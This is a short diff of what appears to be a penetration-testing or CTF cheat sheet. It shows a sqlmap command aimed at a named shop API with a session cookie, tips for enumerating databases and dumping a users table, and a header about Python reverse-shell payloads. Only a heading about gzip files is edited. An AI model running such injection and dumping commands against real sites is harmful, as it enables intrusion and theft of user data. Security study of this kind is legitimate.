@@ -6,7 +6,7 @@ sqlmap -u http://shop.wey-tech.com/account_api.php --cookie="session=c2deb0aa8a2
 ```
 `a` will retrieve everything. If you don't want to do that and instead find the information incrementally to save time for what you're really after then use: `--dbs` to enumerate teh databases, then `--tables -D <db name>` to get the tables, then `-T users --dump` to dump the *users* tables for example.
 
-### You have a gzip compressed data file that doesn't gunzip?
+### You have a gzip compressed data file and want to peep inside?
 Try `zless` or `zcat`.
 
 ### What is a python payload for a reverse shell?
